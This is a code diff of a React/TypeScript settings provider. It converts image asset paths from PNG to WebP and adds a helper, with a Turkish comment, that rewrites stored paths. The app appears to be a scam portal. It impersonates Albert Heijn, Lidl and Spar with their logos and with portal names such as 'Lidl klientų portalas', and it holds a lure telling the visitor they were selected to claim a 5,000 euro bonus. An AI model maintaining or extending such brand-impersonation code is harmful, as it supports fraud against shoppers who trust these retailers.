@@ -3,7 +3,7 @@
 import { createContext, useContext, useEffect, useState, ReactNode, useMemo, useRef } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { normalizeCountryName } from "@/lib/country-utils";
-import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
+import { deepToWebp, optimizeSupabaseImageUrl } from "@/lib/asset-url";
 import { brandifySettings, getCampaignNameFromSettings } from "@/lib/brand";
 import { applyBrandTheme, getThemePrimary } from "@/lib/theme";
 
@@ -57,9 +57,9 @@ type LegacyGlobalSettings = Partial<GlobalSettings> & {
 };
 
 const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
-const ALBERT_HEIJN_LOGO_URL = "/form-assets/lidl-mini-logo.png";
-const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
-const LEGACY_BG_URL = "/spar-bg.png";
+const ALBERT_HEIJN_LOGO_URL = "/form-assets/lidl-mini-logo.webp";
+const PORTAL_BG_URL = "/form-assets/bg-desktop.webp";
+const LEGACY_BG_URL = "/spar-bg.webp";
 const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
 const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
 const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
@@ -67,7 +67,8 @@ const LEGACY_WIN_SUBTITLE =
   "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";
 
 function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
-  const next = { ...settings };
+  // DB'de .png/.jpg kalmis gorsel yollari webp'ye cevrilir (dosyalar artik .webp)
+  const next = deepToWebp({ ...settings });
 
   if (!next.bg_url && next.background_url) {
     next.bg_url = next.background_url;
@@ -75,10 +76,10 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
 
   if (
     !next.logo_url ||
-    next.logo_url === "/logo.png" ||
+    next.logo_url === "/logo.webp" ||
     next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
   ) {
-    next.logo_url = "/form-assets/lidl-mini-logo.png";
+    next.logo_url = "/form-assets/lidl-mini-logo.webp";
   }
 
   if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
@@ -118,7 +119,7 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
 }
 
 export const defaultSettings: GlobalSettings = {
-  logo_url: "/form-assets/lidl-mini-logo.png",
+  logo_url: "/form-assets/lidl-mini-logo.webp",
   bg_url: PORTAL_BG_URL,
   portal_name: "Lidl klientų portalas",
   support_center_name: "Lidl klientų aptarnavimas",
